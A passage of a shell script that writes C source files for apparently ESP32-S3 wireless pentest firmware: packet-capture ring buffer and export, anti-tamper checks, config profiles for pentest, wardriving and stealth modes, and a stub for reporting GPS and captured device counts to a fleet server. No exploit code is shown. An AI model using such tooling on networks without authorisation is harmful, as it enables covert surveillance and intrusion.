                                         sizeof(rec) + payload_len);

    out[PCAP_FRAME_CRC_OFFSET + 0] = (uint8_t)(crc & 0xFFu);
    out[PCAP_FRAME_CRC_OFFSET + 1] = (uint8_t)((crc >> 8) & 0xFFu);
    out[PCAP_FRAME_CRC_OFFSET + 2] = (uint8_t)((crc >> 16) & 0xFFu);
    out[PCAP_FRAME_CRC_OFFSET + 3] = (uint8_t)((crc >> 24) & 0xFFu);

    return ESP_OK;
}

esp_err_t pcap_ring_parse_frame(const uint8_t *buf, size_t buf_len,
                                const uint8_t **out_payload,
                                size_t *out_payload_len,
                                uint32_t *out_crc)
{
    if (buf == NULL ||
        buf_len < PCAP_FRAME_MIN_LEN ||
        out_payload == NULL ||
        out_payload_len == NULL ||
        out_crc == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    uint32_t total_len = ((uint32_t)buf[0]) |
                         ((uint32_t)buf[1] << 8) |
                         ((uint32_t)buf[2] << 16) |
                         ((uint32_t)buf[3] << 24);

    if (total_len < PCAP_FRAME_MIN_LEN || total_len > buf_len) {
        return ESP_ERR_INVALID_SIZE;
    }

    uint32_t stored_crc = ((uint32_t)buf[PCAP_FRAME_CRC_OFFSET + 0]) |
                          ((uint32_t)buf[PCAP_FRAME_CRC_OFFSET + 1] << 8) |
                          ((uint32_t)buf[PCAP_FRAME_CRC_OFFSET + 2] << 16) |
                          ((uint32_t)buf[PCAP_FRAME_CRC_OFFSET + 3] << 24);

    uint32_t calc_crc = pcap_ring_frame_crc32(buf + PCAP_FRAME_HDR_OFFSET,
                                              total_len - PCAP_FRAME_HDR_OFFSET);

    *out_crc = stored_crc;

    if (stored_crc != calc_crc) {
        return ESP_ERR_INVALID_CRC;
    }

    pcaprec_hdr_t rec;
    memcpy(&rec, buf + PCAP_FRAME_HDR_OFFSET, sizeof(rec));

    uint32_t payload_len = total_len - PCAP_FRAME_HDR_OFFSET - sizeof(rec);

    if (rec.incl_len != payload_len || rec.orig_len != payload_len) {
        return ESP_ERR_INVALID_SIZE;
    }

    *out_payload = buf + PCAP_FRAME_HDR_OFFSET + sizeof(rec);
    *out_payload_len = payload_len;

    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Store path
 * ----------------------------------------------------------------------- */

esp_err_t pcap_ring_store(const uint8_t *data, size_t len, const struct timeval *tv)
{
    if (!atomic_load(&g_pcap_ring_active) ||
        g_pcap_ring_buf == NULL ||
        g_pcap_ring_capacity == 0 ||
        g_pcap_ring_mutex == NULL ||
        data == NULL ||
        len == 0 ||
        tv == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    if (len > PCAP_RING_MAX_PAYLOAD) {
        return ESP_ERR_INVALID_SIZE;
    }

    pcaprec_hdr_t rec = {
        .ts_sec = (uint32_t)tv->tv_sec,
        .ts_usec = (uint32_t)tv->tv_usec,
        .incl_len = (uint32_t)len,
        .orig_len = (uint32_t)len,
    };

    uint32_t total_len = (uint32_t)(sizeof(uint32_t) +
                                    sizeof(uint32_t) +
                                    sizeof(rec) +
                                    len);

    if (total_len > g_pcap_ring_capacity) {
        return ESP_ERR_INVALID_SIZE;
    }

    uint32_t crc = 0xFFFFFFFFu;
    crc = crc32_update_raw(crc, (const uint8_t *)&rec, sizeof(rec));
    crc = crc32_update_raw(crc, data, len);
    crc ^= 0xFFFFFFFFu;

    xSemaphoreTake(g_pcap_ring_mutex, portMAX_DELAY);

    if (!atomic_load(&g_pcap_ring_active) ||
        g_pcap_ring_buf == NULL ||
        g_pcap_ring_capacity == 0) {
        xSemaphoreGive(g_pcap_ring_mutex);
        return ESP_ERR_INVALID_STATE;
    }

    if (!pcap_ring_make_room(total_len)) {
        g_pcap_ring_dropped_packets++;
        g_pcap_ring_dropped_bytes += total_len;
        xSemaphoreGive(g_pcap_ring_mutex);
        return ESP_ERR_NO_MEM;
    }

    pcap_ring_write_u32(total_len);
    pcap_ring_write_u32(crc);
    pcap_ring_write_bytes((const uint8_t *)&rec, sizeof(rec));
    pcap_ring_write_bytes(data, len);

    g_pcap_ring_used += total_len;
    g_pcap_ring_packets++;

    xSemaphoreGive(g_pcap_ring_mutex);

    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t pcap_ring_init(size_t size_bytes)
{
    if (g_pcap_ring_mutex == NULL) {
        g_pcap_ring_mutex = xSemaphoreCreateMutex();
        if (g_pcap_ring_mutex == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    if (size_bytes == 0) {
        size_bytes = PCAP_RING_DEFAULT_SIZE;
    }

    if (size_bytes < PCAP_FRAME_MIN_LEN + 128) {
        size_bytes = PCAP_FRAME_MIN_LEN + 128;
    }

    atomic_store(&g_pcap_ring_active, false);

    xSemaphoreTake(g_pcap_ring_mutex, portMAX_DELAY);

    if (g_pcap_ring_buf != NULL && g_pcap_ring_capacity >= size_bytes) {
        pcap_ring_reset_counters_locked();
        xSemaphoreGive(g_pcap_ring_mutex);
        ESP_LOGI(TAG, "PCAP ring reused (%zu bytes)", g_pcap_ring_capacity);
        return ESP_OK;
    }

    if (g_pcap_ring_buf != NULL) {
        heap_caps_free(g_pcap_ring_buf);
        g_pcap_ring_buf = NULL;
        g_pcap_ring_capacity = 0;
        pcap_ring_reset_counters_locked();
    }

    g_pcap_ring_buf = heap_caps_malloc(size_bytes, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (g_pcap_ring_buf == NULL) {
        xSemaphoreGive(g_pcap_ring_mutex);
        ESP_LOGE(TAG, "Failed to allocate %zu bytes in PSRAM", size_bytes);
        return ESP_ERR_NO_MEM;
    }

    g_pcap_ring_capacity = size_bytes;
    pcap_ring_reset_counters_locked();

    xSemaphoreGive(g_pcap_ring_mutex);

    ESP_LOGI(TAG, "PCAP ring initialized (%zu bytes)", size_bytes);
    return ESP_OK;
}

esp_err_t pcap_ring_start(uint32_t duration_sec)
{
    (void)duration_sec;

    if (g_pcap_ring_buf == NULL || g_pcap_ring_capacity == 0) {
        esp_err_t ret = pcap_ring_init(PCAP_RING_DEFAULT_SIZE);
        if (ret != ESP_OK) {
            return ret;
        }
    }

    xSemaphoreTake(g_pcap_ring_mutex, portMAX_DELAY);
    pcap_ring_reset_counters_locked();
    atomic_store(&g_pcap_ring_active, true);
    xSemaphoreGive(g_pcap_ring_mutex);

    ESP_LOGI(TAG, "PCAP ring capture started");
    return ESP_OK;
}

void pcap_ring_stop(void)
{
    atomic_store(&g_pcap_ring_active, false);
    ESP_LOGI(TAG, "PCAP ring capture stopped");
}

bool pcap_ring_is_active(void)
{
    return atomic_load(&g_pcap_ring_active);
}

/* -------------------------------------------------------------------------
 *  Status
 * ----------------------------------------------------------------------- */

uint64_t pcap_ring_filled(void)
{
    if (g_pcap_ring_mutex == NULL) {
        return 0;
    }

    xSemaphoreTake(g_pcap_ring_mutex, portMAX_DELAY);
    uint64_t used = g_pcap_ring_used;
    xSemaphoreGive(g_pcap_ring_mutex);

    return used;
}

void pcap_ring_print_info(void)
{
    if (g_pcap_ring_mutex == NULL) {
        return;
    }

    size_t capacity;
    size_t used;
    uint32_t packets;
    uint32_t dropped_packets;
    uint32_t dropped_bytes;

    xSemaphoreTake(g_pcap_ring_mutex, portMAX_DELAY);
    capacity = g_pcap_ring_capacity;
    used = g_pcap_ring_used;
    packets = g_pcap_ring_packets;
    dropped_packets = g_pcap_ring_dropped_packets;
    dropped_bytes = g_pcap_ring_dropped_bytes;
    xSemaphoreGive(g_pcap_ring_mutex);

    bool active = atomic_load(&g_pcap_ring_active);

    printf("\nPCAP ring: %s\n", active ? "ACTIVE" : "idle");
    printf("  capacity: %zu bytes\n", capacity);
    printf("  used:     %zu bytes\n", used);
    printf("  packets:  %u\n", (unsigned)packets);
    printf("  dropped:  %u packets / %u bytes\n",
           (unsigned)dropped_packets,
           (unsigned)dropped_bytes);
}

/* -------------------------------------------------------------------------
 *  Export helpers
 * ----------------------------------------------------------------------- */

static bool file_write_ring_bytes(FILE *f, size_t offset, size_t len)
{
    uint8_t chunk[PCAP_EXPORT_CHUNK_SIZE];

    size_t done = 0;

    while (done < len) {
        size_t n = len - done;
        if (n > sizeof(chunk)) {
            n = sizeof(chunk);
        }

        pcap_ring_read_bytes_at(offset + done, chunk, n);

        if (fwrite(chunk, 1, n, f) != n) {
            return false;
        }

        done += n;
    }

    return true;
}

typedef struct {
    uint32_t exported;
    uint32_t skipped;
} pcap_export_counts_t;

static esp_err_t export_pcap_stream_locked(FILE *f, pcap_export_counts_t *counts)
{
    if (f == NULL || g_pcap_ring_buf == NULL || g_pcap_ring_capacity == 0) {
        return ESP_ERR_INVALID_STATE;
    }

    pcap_file_header_t hdr = {
        .magic = 0xa1b2c3d4,
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = PCAP_RING_MAX_PAYLOAD,
        .network = 105,
    };

    if (fwrite(&hdr, 1, sizeof(hdr), f) != sizeof(hdr)) {
        return ESP_FAIL;
    }

    size_t cursor = g_pcap_ring_head;
    size_t remaining = g_pcap_ring_used;

    uint32_t exported = 0;
    uint32_t skipped = 0;

    while (remaining > 0) {
        uint32_t total_len = pcap_ring_read_u32_at(cursor);

        if (total_len < PCAP_FRAME_MIN_LEN ||
            total_len > remaining ||
            total_len > g_pcap_ring_capacity) {
            skipped++;
            break;
        }

        uint32_t stored_crc = pcap_ring_read_u32_at(cursor + PCAP_FRAME_CRC_OFFSET);
        uint32_t calc_crc = crc32_ring(cursor + PCAP_FRAME_HDR_OFFSET,
                                       total_len - PCAP_FRAME_HDR_OFFSET);

        bool valid = (stored_crc == calc_crc);

        if (valid) {
            pcaprec_hdr_t rec;
            pcap_ring_read_bytes_at(cursor + PCAP_FRAME_HDR_OFFSET,
                                    (uint8_t *)&rec,
                                    sizeof(rec));

            uint32_t payload_len = total_len - PCAP_FRAME_HDR_OFFSET - sizeof(rec);

            if (rec.incl_len != payload_len || rec.orig_len != payload_len) {
                valid = false;
            } else {
                if (fwrite(&rec, 1, sizeof(rec), f) != sizeof(rec)) {
                    skipped++;
                    break;
                }

                if (!file_write_ring_bytes(f,
                                           cursor + PCAP_FRAME_HDR_OFFSET + sizeof(rec),
                                           payload_len)) {
                    skipped++;
                    break;
                }

                exported++;
            }
        } else {
            skipped++;
        }

        cursor = (cursor + total_len) % g_pcap_ring_capacity;
        remaining -= total_len;
    }

    if (counts != NULL) {
        counts->exported = exported;
        counts->skipped = skipped;
    }

    return ESP_OK;
}

static esp_err_t pcap_ring_export_to_FILE(FILE *f)
{
    if (g_pcap_ring_mutex == NULL ||
        g_pcap_ring_buf == NULL ||
        g_pcap_ring_capacity == 0) {
        return ESP_ERR_INVALID_STATE;
    }

    bool was_active = atomic_load(&g_pcap_ring_active);

    if (was_active) {
        atomic_store(&g_pcap_ring_active, false);
    }

    xSemaphoreTake(g_pcap_ring_mutex, portMAX_DELAY);

    pcap_export_counts_t counts = {0};
    esp_err_t ret = export_pcap_stream_locked(f, &counts);

    xSemaphoreGive(g_pcap_ring_mutex);

    if (was_active) {
        atomic_store(&g_pcap_ring_active, true);
    }

    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "Export complete: %lu frames exported, %lu skipped",
                 (unsigned long)counts.exported,
                 (unsigned long)counts.skipped);
    }

    return ret;
}

/* -------------------------------------------------------------------------
 *  Public export API
 * ----------------------------------------------------------------------- */

esp_err_t pcap_ring_save(const char *path)
{
    if (g_pcap_ring_buf == NULL || g_pcap_ring_capacity == 0) {
        return ESP_ERR_INVALID_STATE;
    }

    if (path == NULL) {
        path = "/sd/pcap_ring.pcap";
    }

    if (strncmp(path, "/sd/", 4) == 0 && !storage_is_ready()) {
        return ESP_ERR_INVALID_STATE;
    }

    FILE *f = fopen(path, "wb");
    if (f == NULL) {
        ESP_LOGE(TAG, "Failed to open PCAP export path: %s", path);
        return ESP_FAIL;
    }

    esp_err_t ret = pcap_ring_export_to_FILE(f);

    fclose(f);

    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "PCAP ring exported to %s", path);
    }

    return ret;
}

esp_err_t pcap_ring_export_serial(void)
{
    if (g_pcap_ring_buf == NULL || g_pcap_ring_capacity == 0) {
        return ESP_ERR_INVALID_STATE;
    }

    if (g_pcap_ring_used == 0) {
        return ESP_ERR_INVALID_STATE;
    }

    /*
     * Warning:
     *
     * This writes binary PCAP data to stdout.
     *
     * This is only safe if stdout is redirected to a file or consumed by a
     * host tool. It is not suitable for JSON-RPC transport directly.
     * For phone transfer, use chunked base64/JSON-RPC or file transfer.
     */
    esp_err_t ret = pcap_ring_export_to_FILE(stdout);

    fflush(stdout);

    return ret;
}

void pcap_ring_wipe(void)
{
    if (g_pcap_ring_mutex == NULL) {
        return;
    }

    xSemaphoreTake(g_pcap_ring_mutex, portMAX_DELAY);
    pcap_ring_reset_counters_locked();
    xSemaphoreGive(g_pcap_ring_mutex);
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/pcap_ring.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/platform_antitamper.c"
#include "platform_antitamper.h"

#include <string.h>
#include <stdio.h>
#include <stdatomic.h>

#include "esp_log.h"
#include "esp_partition.h"
#if __has_include("esp_secure_boot.h")
#include "esp_secure_boot.h"
#else
static inline bool esp_secure_boot_enabled(void) { return false; }
#endif
#if __has_include("esp_flash_encrypt.h")
#include "esp_flash_encrypt.h"
#else
static inline bool esp_flash_encryption_enabled(void) { return false; }
#endif
#if __has_include("esp_efuse.h")
#include "esp_efuse.h"
#endif

#include "nvs.h"

static atomic_bool s_ok = ATOMIC_VAR_INIT(true);
static atomic_bool s_nvs_ok = ATOMIC_VAR_INIT(true);
static atomic_bool s_secure_boot_ok = ATOMIC_VAR_INIT(false);
static atomic_bool s_flash_enc_ok = ATOMIC_VAR_INIT(false);
static const char *TAG = "antitamper";

esp_err_t platform_antitamper_init(void)
{
    atomic_store(&s_ok, true);
    atomic_store(&s_nvs_ok, true);
    atomic_store(&s_secure_boot_ok, esp_secure_boot_enabled());
    #if __has_include("esp_efuse.h")
    atomic_store(&s_flash_enc_ok, esp_efuse_is_flash_encryption_enabled());
#else
    atomic_store(&s_flash_enc_ok, esp_flash_encryption_enabled());
#endif
    
    ESP_LOGI(TAG, "Anti-tamper checks initialized (SB:%d, FE:%d)", 
             atomic_load(&s_secure_boot_ok), atomic_load(&s_flash_enc_ok));
    return ESP_OK;
}

bool platform_antitamper_check(void)
{
    bool ok = true;
    
    /* 1. Verify NVS partition is readable */
    nvs_handle_t h = 0;
    esp_err_t rc = nvs_open("storage", NVS_READONLY, &h);
    if (rc != ESP_OK) {
        ESP_LOGW(TAG, "NVS read failed: 0x%x", rc);
        atomic_store(&s_nvs_ok, false);
        ok = false;
    } else {
        nvs_close(h);
        atomic_store(&s_nvs_ok, true);
    }
    
    /* 2. Verify Secure Boot (if expected) */
    if (!atomic_load(&s_secure_boot_ok)) {
        ESP_LOGW(TAG, "Secure boot is not enabled");
        /* Depending on your security policy, you might want to set ok = false here */
    }
    
    /* 3. Verify Flash Encryption */
    if (!atomic_load(&s_flash_enc_ok)) {
        ESP_LOGW(TAG, "Flash encryption is not enabled");
    }
    
    atomic_store(&s_ok, ok);
    return ok;
}

esp_err_t platform_antitamper_get_report(char *out, size_t max_len)
{
    if (!out || max_len == 0) return ESP_ERR_INVALID_ARG;
    
    int n = snprintf(out, max_len,
                     "{\"nvs_ok\":%s,\"secure_boot\":%s,\"flash_encryption\":%s}", 
                     atomic_load(&s_nvs_ok) ? "true" : "false",
                     atomic_load(&s_secure_boot_ok) ? "true" : "false",
                     atomic_load(&s_flash_enc_ok) ? "true" : "false");
                     
    return (n < 0 || (size_t)n >= max_len) ? ESP_ERR_NO_MEM : ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/platform_antitamper.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/platform_config.c"
#include "platform_config.h"
#include "stealth.h"
#include "wardrive.h"
#include "ai_training.h"

#include <string.h>
#include <stdatomic.h>

#include "esp_log.h"

#include "nvs.h"

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static atomic_int s_profile = CONFIG_PROFILE_PENTEST;
static SemaphoreHandle_t s_lock = NULL;
static const char *TAG = "platform_config";
static const char *NVS_NS = "platform";
static const char *NVS_KEY = "profile";

static const char *profile_name(config_profile_t p)
{
    switch (p) {
        case CONFIG_PROFILE_PENTEST: return "pentest";
        case CONFIG_PROFILE_WARDIRVE: return "wardrive";
        case CONFIG_PROFILE_RESEARCH: return "research";
        case CONFIG_PROFILE_STEALTH: return "stealth";
        default: return "unknown";
    }
}

esp_err_t platform_config_init(void)
{
    if (s_lock == NULL) {
        s_lock = xSemaphoreCreateMutex();
        if (s_lock == NULL) return ESP_ERR_NO_MEM;
    }

    config_profile_t loaded = CONFIG_PROFILE_PENTEST;
    
    nvs_handle_t h = 0;
    esp_err_t rc = nvs_open(NVS_NS, NVS_READONLY, &h);
    if (rc == ESP_OK) {
        uint8_t v = 0;
        if (nvs_get_u8(h, NVS_KEY, &v) == ESP_OK && v < CONFIG_PROFILE_COUNT) {
            loaded = (config_profile_t)v;
        }
        nvs_close(h);
    }
    
    atomic_store(&s_profile, loaded);
    (void)profile_name;
    ESP_LOGI(TAG, "Config profile initialized: %s", profile_name(loaded));
    return ESP_OK;
}

esp_err_t platform_config_apply(config_profile_t profile)
{
    if (profile >= CONFIG_PROFILE_COUNT) return ESP_ERR_INVALID_ARG;
    
    if (s_lock == NULL) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    atomic_store(&s_profile, profile);
    
    /* Apply profile-specific system settings */
    switch (profile) {
        case CONFIG_PROFILE_STEALTH:
            stealth_set_mode(STEALTH_MODE_PASSIVE);
            /* Stealth mode typically means passive listening only */
            break;
            
        case CONFIG_PROFILE_PENTEST:
            stealth_set_mode(STEALTH_MODE_OFF);
            /* Active scanning and attacks allowed */
            break;
            
        case CONFIG_PROFILE_WARDIRVE:
            stealth_set_mode(STEALTH_MODE_OFF);
            /* Start wardrive if GPS is available */
            wardrive_start(WARDRIVE_MODE_BOTH);
            break;
            
        case CONFIG_PROFILE_RESEARCH:
            stealth_set_mode(STEALTH_MODE_OFF);
            /* Enable packet capture and AI training */
            ai_train_start(AI_TRAIN_MODE_BOTH);
            break;
            
        default:
            break;
    }
    
    xSemaphoreGive(s_lock);
    ESP_LOGI(TAG, "Config profile applied: %s", profile_name(profile));
    return ESP_OK;
}

config_profile_t platform_config_get(void)
{
    return (config_profile_t)atomic_load(&s_profile);
}

esp_err_t platform_config_save(void)
{
    if (s_lock == NULL) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    config_profile_t current = (config_profile_t)atomic_load(&s_profile);
    xSemaphoreGive(s_lock);

    nvs_handle_t h = 0;
    esp_err_t rc = nvs_open(NVS_NS, NVS_READWRITE, &h);
    if (rc != ESP_OK) return rc;
    
    rc = nvs_set_u8(h, NVS_KEY, (uint8_t)current);
    if (rc == ESP_OK) rc = nvs_commit(h);
    nvs_close(h);
    
    return rc;
}

esp_err_t platform_config_reset(void)
{
    if (s_lock == NULL) return ESP_ERR_INVALID_STATE;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    atomic_store(&s_profile, CONFIG_PROFILE_PENTEST);
    xSemaphoreGive(s_lock);
    
    return platform_config_save();
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/platform_config.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/platform_fleet.c"
#include "platform_fleet.h"

#include <string.h>
#include <stdatomic.h>

#include "esp_log.h"

#include "nvs_flash.h"
#include "nvs.h"

static atomic_bool s_enabled = ATOMIC_VAR_INIT(false);
static const char *TAG = "fleet";

static const char *NVS_NAMESPACE = "fleet";
static const char *NVS_KEY = "enabled";

esp_err_t platform_fleet_init(void)
{
    nvs_handle_t nvs;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READONLY, &nvs);
    if (err == ESP_OK) {
        uint8_t en = 0;
        if (nvs_get_u8(nvs, NVS_KEY, &en) == ESP_OK) {
            atomic_store(&s_enabled, en != 0);
        }
        nvs_close(nvs);
    }
    
    ESP_LOGI(TAG, "Fleet management initialized (%s)", 
             atomic_load(&s_enabled) ? "enabled" : "disabled");
    return ESP_OK;
}

esp_err_t platform_fleet_set_enabled(bool enable)
{
    atomic_store(&s_enabled, enable);
    
    nvs_handle_t nvs;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &nvs);
    if (err == ESP_OK) {
        nvs_set_u8(nvs, NVS_KEY, enable ? 1 : 0);
        nvs_commit(nvs);
        nvs_close(nvs);
    } else {
        ESP_LOGE(TAG, "Failed to persist fleet state: %s", esp_err_to_name(err));
    }
    
    ESP_LOGI(TAG, "Fleet management %s", enable ? "enabled" : "disabled");
    return ESP_OK;
}

esp_err_t platform_fleet_report(void)
{
    if (!atomic_load(&s_enabled)) {
        return ESP_ERR_NOT_SUPPORTED;
    }
    
    ESP_LOGI(TAG, "Fleet report queued");
    /* 
     * TODO: Implement actual HTTP/MQTT reporting here.
     * This should gather device stats, GPS location, and captured AP/BLE counts,
     * then POST them to the configured fleet server.
     */
    return ESP_OK;
}

bool platform_fleet_is_enabled(void)
{
    return atomic_load(&s_enabled);
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/platform_fleet.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/platform_secure_boot.c"
#include "platform_secure_boot.h"

#include <stdio.h>
#include <string.h>

#include "esp_log.h"
#if __has_include("esp_secure_boot.h")
#include "esp_secure_boot.h"
#else
static inline bool esp_secure_boot_enabled(void) { return false; }
#endif
#include "esp_ota_ops.h"
#if __has_include("esp_app_desc.h")
#include "esp_app_desc.h"
#endif

static bool s_enabled = false;
static const char *TAG = "secure_boot";

esp_err_t platform_secure_boot_init(void)
{
    /* 
     * Check the actual hardware eFuse state, not just the Kconfig compile flag.
     * A device might be compiled with secure boot support, but the eFuses 
     * haven't been burned yet.
     */
    s_enabled = esp_secure_boot_enabled();
    
    if (s_enabled) {
        ESP_LOGI(TAG, "Secure boot is enabled in hardware");
    } else {
#if CONFIG_SECURE_BOOT_ENABLED
        ESP_LOGW(TAG, "Secure boot compiled in, but not enabled in eFuses yet");
#else
        ESP_LOGW(TAG, "Secure boot disabled in Kconfig");
#endif
    }
    
    return ESP_OK;
}

bool platform_secure_boot_is_enabled(void)
{
    return s_enabled;
}

esp_err_t platform_secure_boot_get_fingerprint(char *out, size_t max_len)
{
    if (!out || max_len == 0) return ESP_ERR_INVALID_ARG;
    
    const esp_app_desc_t *app = esp_app_get_description();
    char sha_hex[17];
    for (int i = 0; i < 8; i++) {
        snprintf(sha_hex + (i * 2), 3, "%02x", app->app_elf_sha256[i]);
    }
    sha_hex[16] = '\0';

    int n = snprintf(out, max_len, 
                     "{\"secure_boot\":%s,\"app_version\":\"%s\",\"app_sha\":\"%s\"}",
                     s_enabled ? "true" : "false",
                     app->version,
                     sha_hex);
                     
    return (n < 0 || (size_t)n >= max_len) ? ESP_ERR_NO_MEM : ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/platform_secure_boot.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/port_detect.c"
/*
 * ============================================================================
 *  port_detect.c  —  Boot-time USB transport detection for ESP32-S3
 * ============================================================================
 */

#include "port_detect.h"

#include <string.h>
#include <stdio.h>

#include "esp_log.h"
#include "esp_system.h"

#if __has_include("soc/usb_serial_jtag_reg.h")
#include "soc/usb_serial_jtag_reg.h"
#endif
#if __has_include("driver/usb_serial_jtag.h")
#include "driver/usb_serial_jtag.h"
#endif

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

/* Fallback color macros if not defined in common_types.h */
#ifndef GRY
#define GRY "\033[90m"
#define GRN "\033[32m"
#define YLW "\033[33m"
#define RED "\033[31m"
#define WHT "\033[37m"
#define R0  "\033[0m"
#endif

static const char *TAG = "port_detect";

/* Global boot-time detection result, populated once at startup. */
port_detect_result_t g_boot_port;

/* -------------------------------------------------------------------------
 *  Low-level: probe USB-Serial-JTAG controller enable state
 * ----------------------------------------------------------------------- */
static bool usb_serial_jtag_is_enabled(void)
{
    /* 
     * Primary check: Kconfig. If the firmware was compiled for JTAG console,
     * it is the intended transport.
     */
#if defined(CONFIG_ESP_CONSOLE_USB_SERIAL_JTAG) || defined(CONFIG_ESP_CONSOLE_USB_SERIAL_JTAG_ENABLED)
    return true;
#else
    /* Fallback: Direct register check */
    #ifdef USB_SERIAL_JTAG_CONF0_REG
        uint32_t conf = READ_PERI_REG(USB_SERIAL_JTAG_CONF0_REG);
        #ifdef USB_SERIAL_JTAG_USB_PAD_ENABLE_M
            return (conf & USB_SERIAL_JTAG_USB_PAD_ENABLE_M) != 0;
        #else
            return (conf & BIT(17)) != 0; /* USB_PAD_ENABLE is typically bit 17 */
        #endif
    #else
        return false;
    #endif
#endif
}

/* -------------------------------------------------------------------------
 *  Low-level: probe TinyUSB CDC-ACM enable state
 *
 *  NOTE: We DO NOT use tud_cdc_connected() here. That function checks if 
 *  the host has enumerated and opened the port, which takes hundreds of 
 *  milliseconds. At boot time, it will almost always return false.
 *  Instead, we check Kconfig to see if the firmware was BUILT for CDC.
 * ----------------------------------------------------------------------- */
static bool cdc_acm_is_enabled(void)
{
#if defined(CONFIG_TINYUSB_CDC_ENABLED) || defined(CONFIG_ESP_CONSOLE_USB_CDC)
    return true;
#else
    return false;
#endif
}

/* -------------------------------------------------------------------------
 *  Public API
 * ----------------------------------------------------------------------- */
esp_err_t boot_port_detect(port_detect_result_t *out_result)
{
    if (out_result == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(out_result, 0, sizeof(*out_result));

    bool jtag = usb_serial_jtag_is_enabled();
    bool cdc  = cdc_acm_is_enabled();

    out_result->usb_serial_jtag_present = jtag;
    out_result->cdc_acm_present         = cdc;
    out_result->both_active             = jtag && cdc;

    if (jtag && !cdc) {
        out_result->active = PORT_TRANSPORT_UART0;
        out_result->reason = PORT_REASON_JTAG_ONLY;
    } else if (cdc && !jtag) {
        out_result->active = PORT_TRANSPORT_CDC;
        out_result->reason = PORT_REASON_CDC_ONLY;
    } else if (jtag && cdc) {
        /* 
         * ESP32-S3 hardware constraint: USB-Serial-JTAG and USB-OTG share 
         * the same PHY. They cannot be active simultaneously. If Kconfig 
         * somehow enabled both, JTAG usually wins at the hardware level.
         */
        out_result->active = PORT_TRANSPORT_UART0;
        out_result->reason = PORT_REASON_BOTH;
    } else {
        out_result->active = PORT_TRANSPORT_UART0;
        out_result->reason = PORT_REASON_FALLBACK;
    }

    ESP_LOGI(TAG,
             "detect complete: jtag=%d cdc=%d active=%s reason=0x%02X",
             jtag, cdc,
             port_transport_name(out_result->active),
             out_result->reason);

    return ESP_OK;
}

const char *port_transport_name(port_transport_t t)
{
    switch (t) {
        case PORT_TRANSPORT_UART0: return "UART0 (USB-Serial-JTAG / COM)";
        case PORT_TRANSPORT_CDC:   return "USB-OTG CDC-ACM";
        case PORT_TRANSPORT_BOTH:  return "BOTH (ambiguous)";
        case PORT_TRANSPORT_UNKNOWN:
        default:                   return "UNKNOWN";
    }
}

void port_print_banner(const port_detect_result_t *res)
{
    if (res == NULL) {
        return;
    }

    printf("\n");
    printf("  ┌─ " GRY "USB Transport Detection" R0 "\n");
    printf("  │\n");

    if (res->usb_serial_jtag_present) {
        printf("  │  " GRN "✔" R0 "  USB-Serial-JTAG / COM port detected\n");
    } else {
        printf("  │  " YLW "⚠" R0 "  USB-Serial-JTAG / COM port: not detected\n");
    }

    if (res->cdc_acm_present) {
        printf("  │  " GRN "✔" R0 "  USB-OTG CDC-ACM detected (phone-ready)\n");
    } else {
        printf("  │  " YLW "⚠" R0 "  USB-OTG CDC-ACM: not detected\n");
    }

    printf("  │\n");
    printf("  │  Active transport : " WHT "%s" R0 "\n",
           port_transport_name(res->active));
    printf("  │  Reason code      : 0x%02X\n", res->reason);

    if (res->both_active) {
        printf("  │\n");
        printf("  │  " RED "!" R0 "  Both USB functions reported active in Kconfig. "
               "PHY conflict possible on silicon.\n");
        printf("  │      Only one can be used at a time. Defaulting to COM.\n");
    }

    if (res->active == PORT_TRANSPORT_UART0 && !res->usb_serial_jtag_present) {
        printf("  │\n");
        printf("  │  " YLW "fallback" R0 "  No transport detected; using UART0 as safe default.\n");
    }

    printf("  │\n");
}

port_transport_t port_detect_get_active(void)
{
    return g_boot_port.active;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/port_detect.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/port_detect.h"
#ifndef PORT_DETECT_H
#define PORT_DETECT_H

#include "common_types.h"
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

esp_err_t boot_port_detect(port_detect_result_t *out_result);
const char *port_transport_name(port_transport_t t);
port_transport_t port_detect_get_active(void);
void port_print_banner(const port_detect_result_t *res);

/* Global cache of boot-time detection. Other modules may read this
 * after `boot_port_detect()` has been called. */
extern port_detect_result_t g_boot_port;

#ifdef __cplusplus
}
#endif

#endif // PORT_DETECT_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/port_detect.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/stealth.c"
#include "stealth.h"

#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <stdatomic.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_system.h"
#if __has_include("esp_random.h")
#include "esp_random.h"
#endif
#include "esp_mac.h" /* For MACSTR / MAC2STR if needed, or manual print */

